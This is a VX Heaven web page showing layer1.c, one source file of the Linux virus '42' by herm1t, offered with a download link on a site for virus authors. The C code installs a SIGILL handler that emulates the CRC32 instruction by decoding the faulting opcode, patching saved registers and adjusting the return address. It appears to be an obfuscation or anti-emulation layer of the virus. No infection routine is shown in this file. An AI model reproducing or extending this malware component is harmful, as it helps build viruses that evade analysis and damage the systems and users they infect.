<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>42 - Virus for Linux written by herm1t (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"18d3f38a1101daed52be673781bd3d01c36e1ef5-1498759749-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Source code of computer viruses</h1><h2>42</h2><p><em>Virus for Linux</em></p><p><strong>herm1t</strong><br/><small><a href="/src.php?author=herm1t">Show all viruses by this author</a></small></p><small><a href="/src.php?info=42.zip">Description and download</a></small><br/><p>2008-08-08</p><h2>layer1.c</h2> [<a href="/src_view.php?file=42.zip">Index</a>] [<a href="/src_view.php?file=42.zip&amp;view=layer1.c&amp;highlight=off">Turn off syntax highlighting</a>] <hr/><pre class="c" style="font-family:monospace;color: #000066; background-color: #cccbbb;"><span style="color: #339933;">#include &lt;stdint.h&gt;</span>
<span style="color: #339933;">#include &lt;signal.h&gt;</span>
&nbsp;
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> layer1<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> layer1_e<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.globl layer1; layer1: call setup; ret&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #339933;">#include &quot;syscalls.h&quot;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> <span style="color: #000000; font-weight: bold;">inline</span> bzero<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>dst<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> size<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> size<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #339933;">*</span>dst<span style="color: #339933;">++</span> <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> crc_handler<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> n<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> __attribute__<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>used<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> setup<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">struct</span> sigaction sa<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> handler <span style="color: #339933;">=</span>
		<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span>__builtin_return_address<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">-</span> <span style="color: #0000dd;">5</span> <span style="color: #339933;">+</span>
		<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>crc_handler <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>layer1<span style="color: #339933;">;</span>
	bzero<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>sa<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>sa<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	sa.<span style="color: #202020;">sa_handler</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>handler<span style="color: #339933;">;</span>
	sigaction<span style="color: black;">&#40;</span>SIGILL<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>sa<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">uint32_t</span> crc32c_intel<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span> crc<span style="color: #339933;">,</span> <span style="color: #993333;">uint8_t</span> data<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	crc <span style="color: #339933;">^=</span> data<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">8</span><span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		crc <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>crc <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">^</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>crc <span style="color: #339933;">&amp;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> <span style="color: #208080;">0x82F63B78</span> <span style="color: #339933;">:</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> crc<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> crc_handler<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> n<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>p <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>n <span style="color: #339933;">+</span> <span style="color: #0000dd;">15</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* CRC32 Gq, Eb */</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>p <span style="color: #339933;">==</span> <span style="color: #208080;">0xf0380ff2</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
<span style="color: #339933;">#define regs(x) (*(uint32_t*)(&amp;n + 12 - x))</span>
		<span style="color: #808080; font-style: italic;">/* check modrm */</span>
		<span style="color: #993333;">uint8_t</span> modrm<span style="color: #339933;">,</span> reg<span style="color: #339933;">,</span> rm<span style="color: #339933;">;</span>
		modrm <span style="color: #339933;">=</span> p<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>modrm <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xc0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">||</span> <span style="color: black;">&#40;</span>modrm <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xfe</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span>
			<span style="color: #b1b100;">return</span><span style="color: #339933;">;</span>	
		reg <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>modrm <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #0000dd;">7</span><span style="color: #339933;">;</span>
		rm <span style="color: #339933;">=</span> modrm <span style="color: #339933;">&amp;</span> <span style="color: #0000dd;">7</span><span style="color: #339933;">;</span>
		<span style="color: #808080; font-style: italic;">/* run */</span>
		regs<span style="color: black;">&#40;</span>reg<span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> crc32c_intel<span style="color: black;">&#40;</span>regs<span style="color: black;">&#40;</span>reg<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint8_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>regs<span style="color: black;">&#40;</span>rm<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: #808080; font-style: italic;">/* adjust return address */</span>
		<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>n <span style="color: #339933;">+</span> <span style="color: #0000dd;">15</span><span style="color: black;">&#41;</span> <span style="color: #339933;">+=</span> <span style="color: #0000dd;">5</span><span style="color: #339933;">;</span>		
	<span style="color: black;">&#125;</span>
<span style="color: black;">&#125;</span>
&nbsp;
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.globl layer1_e; layer1_e:&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=42.zip&amp;view=layer1.c">de</a><a href="/src_view.php?lang=en&amp;file=42.zip&amp;view=layer1.c">en</a><a href="/src_view.php?lang=es&amp;file=42.zip&amp;view=layer1.c">es</a><a href="/src_view.php?lang=it&amp;file=42.zip&amp;view=layer1.c">it</a><a href="/src_view.php?lang=fr&amp;file=42.zip&amp;view=layer1.c">fr</a><a href="/src_view.php?lang=pl&amp;file=42.zip&amp;view=layer1.c">pl</a><a href="/src_view.php?lang=ru&amp;file=42.zip&amp;view=layer1.c">ru</a><a href="/src_view.php?lang=ua&amp;file=42.zip&amp;view=layer1.c">ua</a></div>
</body>
</html>
